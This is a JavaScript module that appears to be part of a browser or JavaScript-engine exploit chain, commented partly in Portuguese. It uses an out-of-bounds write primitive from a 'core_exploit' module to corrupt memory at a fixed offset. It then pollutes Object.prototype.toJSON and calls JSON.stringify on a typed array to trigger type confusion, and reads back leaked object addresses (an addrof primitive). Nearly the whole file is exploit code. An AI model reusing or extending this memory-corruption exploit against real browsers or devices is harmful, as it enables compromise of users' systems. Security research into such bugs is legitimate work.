// js/script3/testArrayBufferVictimCrash.mjs (v_typedArray_addrof_v6_AdjustCrashCondition)

import { logS3, PAUSE_S3 } from './s3_utils.mjs';
import { AdvancedInt64, toHex } from '../utils.mjs';
import {
    triggerOOB_primitive,
    oob_array_buffer_real,
    oob_write_absolute,
    clearOOBEnvironment
} from '../core_exploit.mjs';

export const FNAME_MODULE_TYPEDARRAY_ADDROF_V6_ACC = "OriginalHeisenbug_TypedArrayAddrof_v6_AdjustCrashCondition";

const VICTIM_BUFFER_SIZE = 256;
const LOCAL_HEISENBUG_CRITICAL_WRITE_OFFSET = 0x7C;
// AJUSTE NO VALOR CRÍTICO PARA TENTAR EVITAR CRASH POR FALTA DE MEMÓRIA
const LOCAL_HEISENBUG_CRITICAL_WRITE_VALUE = 0x7FFFFFFF; // Anteriormente 0xFFFFFFFF

let last_probe_call_details_v6 = null;
let object_to_leak_A_v6 = null;
let object_to_leak_B_v6 = null;
let victim_typed_array_ref_v6 = null;

function toJSON_TA_Probe_AdjustCrashCondition() {
    let current_call_details = {
        probe_variant: "TA_Probe_Addrof_v6_AdjustCrashCondition",
        this_type_in_toJSON: "N/A_before_call",
        error_in_toJSON: null,
        probe_called: true,
        this_was_victim_ref_when_confused: null,
        writes_attempted_on_confused_this: false
    };

    try {
        current_call_details.this_type_in_toJSON = Object.prototype.toString.call(this);
        
        logS3(`[${current_call_details.probe_variant}] Sonda INVOCADA. 'this' type: ${current_call_details.this_type_in_toJSON}. 'this' === victim_typed_array_ref_v6? ${this === victim_typed_array_ref_v6}`, "leak");

        if (current_call_details.this_type_in_toJSON === '[object Object]') {
            logS3(`[${current_call_details.probe_variant}] TYPE CONFUSION DETECTED for 'this' (now [object Object])!`, "vuln");
            
            current_call_details.this_was_victim_ref_when_confused = (this === victim_typed_array_ref_v6);
            logS3(`[${current_call_details.probe_variant}] At confusion, 'this' === victim_typed_array_ref_v6? ${current_call_details.this_was_victim_ref_when_confused}`, "info");

            logS3(`[${current_call_details.probe_variant}] Attempting addrof writes on the confused 'this' ([object Object])...`, "warn");
            if (object_to_leak_A_v6) {
                this[0] = object_to_leak_A_v6;
                logS3(`[${current_call_details.probe_variant}] Wrote object_to_leak_A_v6 to this[0].`, "info");
            }
            if (object_to_leak_B_v6) {
                this[1] = object_to_leak_B_v6;
                logS3(`[${current_call_details.probe_variant}] Wrote object_to_leak_B_v6 to this[1].`, "info");
            }
            current_call_details.writes_attempted_on_confused_this = true;

        } else if (this === victim_typed_array_ref_v6) {
            logS3(`[${current_call_details.probe_variant}] 'this' is victim_typed_array_ref_v6, type is ${current_call_details.this_type_in_toJSON}. No confusion yet for this 'this'.`, "info");
        } else {
            logS3(`[${current_call_details.probe_variant}] 'this' (type: ${current_call_details.this_type_in_toJSON}) is not victim_typed_array_ref_v6. No action.`, "warn");
        }

    } catch (e) {
        current_call_details.error_in_toJSON = `${e.name}: ${e.message}`;
        logS3(`[${current_call_details.probe_variant}] ERROR in probe: ${e.name} - ${e.message}`, "error");
    }
    
    logS3(`[${current_call_details.probe_variant}] Probe FINISHING. Current_call_details to be set to global: ${JSON.stringify(current_call_details)}`, "dev");
    last_probe_call_details_v6 = { ...current_call_details };

    return { minimal_probe_v6_did_execute: true }; 
}

export async function executeTypedArrayVictimAddrofTest_AdjustCrashCondition() {
    const FNAME_CURRENT_TEST = `${FNAME_MODULE_TYPEDARRAY_ADDROF_V6_ACC}.triggerAndAddrof`;
    logS3(`--- Initiating ${FNAME_CURRENT_TEST}: Heisenbug (TypedArray, AdjustCrashCondition) & Addrof Attempt ---`, "test", FNAME_CURRENT_TEST);
    document.title = `${FNAME_MODULE_TYPEDARRAY_ADDROF_V6_ACC} Init...`;

    last_probe_call_details_v6 = null;
    victim_typed_array_ref_v6 = null;
    object_to_leak_A_v6 = { marker: "ObjA_TA_v6acc", id: Date.now() }; 
    object_to_leak_B_v6 = { marker: "ObjB_TA_v6acc", id: Date.now() + 890 };

    let errorCapturedMain = null;
    let stringifyOutput = null;
    let captured_probe_details_after_stringify = null;
    
    let addrof_result_A = { success: false, leaked_address_as_double: null, leaked_address_as_int64: null, message: "Addrof A @ view[0]: Not attempted or Heisenbug/write failed." };
    let addrof_result_B = { success: false, leaked_address_as_double: null, leaked_address_as_int64: null, message: "Addrof B @ view[1]: Not attempted or Heisenbug/write failed." };
    
    const fillPattern = 0.55667788990011;

    try {
        await triggerOOB_primitive({ force_reinit: true });
        if (!oob_array_buffer_real && typeof oob_write_absolute !== 'function') {
            throw new Error("OOB Init failed or oob_write_absolute not available.");
        }
        logS3("OOB Environment initialized.", "info", FNAME_CURRENT_TEST);
        logS3(`   OOB corruption target in oob_array_buffer_real: ${toHex(LOCAL_HEISENBUG_CRITICAL_WRITE_OFFSET)}`, "info", FNAME_CURRENT_TEST);

        await PAUSE_S3(50); // Nova pausa ANTES da escrita crítica
        logS3(`STEP 1: Writing CRITICAL value ${toHex(LOCAL_HEISENBUG_CRITICAL_WRITE_VALUE)} to oob_array_buffer_real[${toHex(LOCAL_HEISENBUG_CRITICAL_WRITE_OFFSET)}]...`, "warn", FNAME_CURRENT_TEST);
        oob_write_absolute(LOCAL_HEISENBUG_CRITICAL_WRITE_OFFSET, LOCAL_HEISENBUG_CRITICAL_WRITE_VALUE, 4);
        logS3(`  Critical OOB write to ${toHex(LOCAL_HEISENBUG_CRITICAL_WRITE_OFFSET)} performed.`, "info", FNAME_CURRENT_TEST);
        
        await PAUSE_S3(200); // Pausa DEPOIS da escrita crítica aumentada

        victim_typed_array_ref_v6 = new Uint8Array(new ArrayBuffer(VICTIM_BUFFER_SIZE)); // Simplificado
        let float64_view_on_underlying_ab = new Float64Array(victim_typed_array_ref_v6.buffer);
        
        for(let i = 0; i < float64_view_on_underlying_ab.length; i++) {
            float64_view_on_underlying_ab[i] = fillPattern + i;
        }

        logS3(`STEP 2: victim_typed_array_ref_v6 (Uint8Array on buffer size ${VICTIM_BUFFER_SIZE}) created. View filled with ${float64_view_on_underlying_ab[0]}.`, "test", FNAME_CURRENT_TEST);
        logS3(`   Attempting JSON.stringify on victim_typed_array_ref_v6 with ${toJSON_TA_Probe_AdjustCrashCondition.name}...`, "test", FNAME_CURRENT_TEST);
        
        const ppKey = 'toJSON';
        let originalToJSONDescriptor = Object.getOwnPropertyDescriptor(Object.prototype, ppKey);
        let pollutionApplied = false;

        try {
            Object.defineProperty(Object.prototype, ppKey, {
                value: toJSON_TA_Probe_AdjustCrashCondition,
                writable: true, configurable: true, enumerable: false
            });
            pollutionApplied = true;
            logS3(`  Object.prototype.${ppKey} polluted with ${toJSON_TA_Probe_AdjustCrashCondition.name}.`, "info", FNAME_CURRENT_TEST);

            logS3(`  Calling JSON.stringify(victim_typed_array_ref_v6)...`, "warn", FNAME_CURRENT_TEST);
            stringifyOutput = JSON.stringify(victim_typed_array_ref_v6); 
            
            logS3(`  JSON.stringify(victim_typed_array_ref_v6) completed. Stringify Output: ${stringifyOutput ? JSON.stringify(stringifyOutput) : 'N/A'}`, "info", FNAME_CURRENT_TEST);
            
            logS3(`  Global 'last_probe_call_details_v6' state immediately after stringify: ${last_probe_call_details_v6 ? JSON.stringify(last_probe_call_details_v6) : 'null'}`, "dev");

            if (last_probe_call_details_v6) {
                captured_probe_details_after_stringify = { ...last_probe_call_details_v6 }; 
            }
            logS3(`  Copied 'captured_probe_details_after_stringify': ${captured_probe_details_after_stringify ? JSON.stringify(captured_probe_details_after_stringify) : 'N/A'}`, "leak", FNAME_CURRENT_TEST);

            if (captured_probe_details_after_stringify && 
                captured_probe_details_after_stringify.probe_called &&
                captured_probe_details_after_stringify.this_type_in_toJSON === "[object Object]") {
                
                logS3(`  HEISENBUG CONFIRMED (via captured last probe details)! 'this' type in last probe: ${captured_probe_details_after_stringify.this_type_in_toJSON}`, "vuln", FNAME_CURRENT_TEST);
                logS3(`    In confused probe, 'this' === victim_typed_array_ref_v6? ${captured_probe_details_after_stringify.this_was_victim_ref_when_confused}`, "info");
                logS3(`    In confused probe, addrof writes attempted? ${captured_probe_details_after_stringify.writes_attempted_on_confused_this}`, "info");
                
                logS3("STEP 3: Checking float64_view_on_underlying_ab AFTER Heisenbug and probe's write attempts...", "warn", FNAME_CURRENT_TEST);

                const val_A_double = float64_view_on_underlying_ab[0];
                addrof_result_A.leaked_address_as_double = val_A_double;
                let temp_buf_A = new ArrayBuffer(8); new Float64Array(temp_buf_A)[0] = val_A_double;
                addrof_result_A.leaked_address_as_int64 = new AdvancedInt64(new Uint32Array(temp_buf_A)[0], new Uint32Array(temp_buf_A)[1]);
                logS3(`  Value read from float64_view_on_underlying_ab[0] (for ObjA): ${val_A_double} (${addrof_result_A.leaked_address_as_int64.toString(true)})`, "leak", FNAME_CURRENT_TEST);

                if (val_A_double !== (fillPattern + 0) && val_A_double !== 0 &&
                    (addrof_result_A.leaked_address_as_int64.high() < 0x00020000 || (addrof_result_A.leaked_address_as_int64.high() & 0xFFFF0000) === 0xFFFF0000) ) {
                    logS3("  !!!! POTENTIAL POINTER READ at view[0] (ObjA) !!!!", "vuln", FNAME_CURRENT_TEST);
                    addrof_result_A.success = true;
                    addrof_result_A.message = "Heisenbug (AdjustCrashCondition) confirmed AND view[0] read suggests a pointer for ObjA.";
                } else {
                    addrof_result_A.message = "Heisenbug (AdjustCrashCondition) confirmed, but view[0] read does not look like a pointer for ObjA or buffer was unchanged.";
                    if (val_A_double === (fillPattern + 0)) addrof_result_A.message += " (Value matches initial fillPattern)";
                }

                const val_B_double = float64_view_on_underlying_ab[1];
                addrof_result_B.leaked_address_as_double = val_B_double;
                let temp_buf_B = new ArrayBuffer(8); new Float64Array(temp_buf_B)[0] = val_B_double;
                addrof_result_B.leaked_address_as_int64 = new AdvancedInt64(new Uint32Array(temp_buf_B)[0], new Uint32Array(temp_buf_B)[1]);
                logS3(`  Value read from float64_view_on_underlying_ab[1] (for ObjB): ${val_B_double} (${addrof_result_B.leaked_address_as_int64.toString(true)})`, "leak", FNAME_CURRENT_TEST);
                
                if (val_B_double !== (fillPattern + 1) && val_B_double !== 0 &&
                    (addrof_result_B.leaked_address_as_int64.high() < 0x00020000 || (addrof_result_B.leaked_address_as_int64.high() & 0xFFFF0000) === 0xFFFF0000) ) {
                    logS3("  !!!! POTENTIAL POINTER READ at view[1] (ObjB) !!!!", "vuln", FNAME_CURRENT_TEST);
                    addrof_result_B.success = true;
                    addrof_result_B.message = "Heisenbug (AdjustCrashCondition) confirmed AND view[1] read suggests a pointer for ObjB.";
                } else {
                    addrof_result_B.message = "Heisenbug (AdjustCrashCondition) confirmed, but view[1] read does not look like a pointer for ObjB or buffer was unchanged.";
                    if (val_B_double === (fillPattern + 1)) addrof_result_B.message += " (Value matches initial fillPattern)";
                }

                if (addrof_result_A.success || addrof_result_B.success) {
                    document.title = `${FNAME_MODULE_TYPEDARRAY_ADDROF_V6_ACC}: Addr? SUCCESS!`;
                } else {
                    document.title = `${FNAME_MODULE_TYPEDARRAY_ADDROF_V6_ACC}: Heisenbug OK, Addr Failed`;
                }

            } else {
                let msg = "Heisenbug (TypedArray as [object Object]) NOT confirmed via captured last probe details.";
                if(captured_probe_details_after_stringify && captured_probe_details_after_stringify.this_type_in_toJSON) {
                    msg += ` 'this' type in last probe: ${captured_probe_details_after_stringify.this_type_in_toJSON}.`;
                } else if (!captured_probe_details_after_stringify) {
                    msg += " Captured last probe details are null.";
                } else if (captured_probe_details_after_stringify && !captured_probe_details_after_stringify.probe_called) {
                    msg += " Captured last probe details indicate probe was not called (probe_called is false).";
                }
                addrof_result_A.message = msg; addrof_result_B.message = msg;
                logS3(`  ALERT: ${msg}`, "error", FNAME_CURRENT_TEST);
                document.title = `${FNAME_MODULE_TYPEDARRAY_ADDROF_V6_ACC}: Heisenbug Failed`;
            }

        } catch (e_str) {
            errorCapturedMain = e_str;
            logS3(`    CRITICAL ERROR during JSON.stringify or addrof logic: ${e_str.name} - ${e_str.message}${e_str.stack ? '\n'+e_str.stack : ''}`, "critical", FNAME_CURRENT_TEST);
            document.title = `${FNAME_MODULE_TYPEDARRAY_ADDROF_V6_ACC}: Stringify/Addrof ERR`;
            addrof_result_A.message = `Main execution error: ${e_str.name} - ${e_str.message}`;
            addrof_result_B.message = `Main execution error: ${e_str.name} - ${e_str.message}`;
        } finally {
            if (pollutionApplied) {
                if (originalToJSONDescriptor) Object.defineProperty(Object.prototype, ppKey, originalToJSONDescriptor);
                else delete Object.prototype[ppKey];
                logS3(`  Object.prototype.${ppKey} restored.`, "info", FNAME_CURRENT_TEST);
            }
        }

    } catch (e_outer_main) {
        errorCapturedMain = e_outer_main;
        logS3(`OVERALL CRITICAL ERROR in test: ${e_outer_main.name} - ${e_outer_main.message}`, "critical", FNAME_CURRENT_TEST);
        if (e_outer_main.stack) logS3(`Stack: ${e_outer_main.stack}`, "critical", FNAME_CURRENT_TEST);
        document.title = `${FNAME_MODULE_TYPEDARRAY_ADDROF_V6_ACC} CRITICALLY FAILED`;
        addrof_result_A.message = `Overall test error: ${e_outer_main.name}`;
        addrof_result_B.message = `Overall test error: ${e_outer_main.name}`;
    } finally {
        clearOOBEnvironment();
        logS3(`--- ${FNAME_CURRENT_TEST} Completed ---`, "test", FNAME_CURRENT_TEST);
        logS3(`Addrof A Result (view[0]): Success=${addrof_result_A.success}, Msg='${addrof_result_A.message}'`, addrof_result_A.success ? "good" : "warn", FNAME_CURRENT_TEST);
        if(addrof_result_A.leaked_address_as_int64){
            logS3(`  Addrof A (Int64): ${addrof_result_A.leaked_address_as_int64.toString(true)}`, "leak", FNAME_CURRENT_TEST);
        }
        logS3(`Addrof B Result (view[1]): Success=${addrof_result_B.success}, Msg='${addrof_result_B.message}'`, addrof_result_B.success ? "good" : "warn", FNAME_CURRENT_TEST);
        if(addrof_result_B.leaked_address_as_int64){
            logS3(`  Addrof B (Int64): ${addrof_result_B.leaked_address_as_int64.toString(true)}`, "leak", FNAME_CURRENT_TEST);
        }
        
        object_to_leak_A_v6 = null;
        object_to_leak_B_v6 = null;
        victim_typed_array_ref_v6 = null;
        last_probe_call_details_v6 = null; 
    }
    return { 
        errorOccurred: errorCapturedMain, 
        potentiallyCrashed: false, // Se o crash retornar, precisaremos reavaliar isso.
        stringifyResult: stringifyOutput, 
        toJSON_details: captured_probe_details_after_stringify, 
        addrof_A_attempt_result: addrof_result_A,
        addrof_B_attempt_result: addrof_result_B
    };
}
